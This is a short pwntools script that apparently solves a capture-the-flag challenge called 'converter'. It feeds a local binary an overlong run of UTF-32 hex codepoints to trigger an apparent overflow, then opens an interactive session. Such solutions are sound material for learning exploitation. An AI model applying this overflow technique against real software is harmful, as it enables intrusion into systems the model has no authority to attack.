from pwn import *

def to_utf32(s):
    utf32be_hex = ''
    for c in s:
        tmp = ord(c)
        utf32be_hex += f"{tmp:08x}"
    return utf32be_hex

elf_path = './chall'
#elf_path = '../converter2/chall'
elf = ELF(elf_path)
io = process(elf_path)

#io.sendlineafter('> ', '0001F680')
#io.sendlineafter('> ', '0001F98A')
io.sendlineafter('> ', '0001F680' * 31 + '0')
io.sendlineafter('> ', '0000041')
io.sendlineafter('> ', '0001F98A')

io.interactive()
